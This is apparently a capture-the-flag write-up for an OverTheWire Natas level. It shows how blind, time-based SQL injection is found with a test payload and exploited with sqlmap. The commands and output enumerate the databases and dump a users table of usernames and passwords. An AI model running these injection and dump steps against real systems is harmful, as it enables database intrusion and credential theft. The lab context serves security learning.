@@ -1,0 +1,89 @@
+Title:Natas Level 16 → Level 17 (Time/Blind Based SQLi)
+
+#Credentials
+Username: natas17
+Passowrd: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+URL:      http://natas17.natas.labs.overthewire.org
+
+#Concept:
+In the previous sqli writeups I've mentioned about the different types of the sql injections and in this level it talks about the the time-based sql injection as well as the blind based sql injection, well techncially it is 1 vulnerability but it can be solved in twoways.
+
+#note:I solved it using the tool called the "sqlmap" there are also other ways which you can perform this and let me know.
+
+#Solution
+
+1.Login to the website using the credentials mentioned above.
+
+2.After logging in to the website the website will display an input field of the username
+
+#Before actually starting out the actual test, I first normally check the working input field to get the actual idea of how it works, simply give the name of the next level which is "natas18" after entering it the output displayed it as nothing, normally if you looked at the "source code" you can see that it should respond as the "The user exist" if not then it will say "User does not exist" but to my suprise it didn't displayed anything.Hence I came to conclusion that this vulnerability is "Blind_Based SQLi"( Since it didn't display anything for the correct input nor for the wrong output)
+
+3.Try giving malicious input such as "AND"1"=="1; 
+
+#This will give nothing as the output ( Even though it is incorrect and it should have displayed as "Error in query" The reason is that in the source code the result is commented out which means the result which was written will be no longer be working or in other words it is no longer part of the code hence the invisible result.) 
+----------------------------------------------------------------------------------------
+***You can solve this manually by creating your own script
+----------------------------------------------------------------------------------------
+4.Open up the burpsuite tool intercept the request and make the request as "copy as file"and give whatever name you want.
+
+#Just using the old techinques which I've learned in the previous writeup
+
+5.Open up the terminal and type in the following "sqlmap -r <filename> --level=3
+
+#Output
+
+14:39:28] [INFO] the back-end DBMS is MySQL
+[14:39:28] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL >= 5.0.12
+
+6.Then type in the following command "sqlmap <filename> --dbs"
+
+#Output
+#note:The tool will ask you to include the --time-sec {This is used for time based SQli}
+and type "y" and repeat the same process for the rest of the writeup
+
+[14:45:56] [INFO] retrieved: natas17
+available databases [3]:
+[*] performance_schema
+[*] information_schema
+[*] natas17
+
+7.Type "sqlmap <filename> -D natas17 --columns"
+
+#Output
+
+Database: natas17
+Table: users
+[2 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| password | varchar(64) |
+| username | varchar(64) |
++----------+-------------+
+
+8.Then type "sqlmap <filename> -D natas17 -C username,password --dump"
+
+#Output 
+
+#note: Since we are using the time-based the tool will take a long time to give you the results
+
+Database: natas17
+Table: users
+[4 entries]
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| user1    | 0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd |
+| natas18  | 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ |
+| user2    | MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2 |
+| user3    | VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD |
++----------+----------------------------------+
+
+9.Copy the password and store it in a safe place.
+
+10.Done
+
+
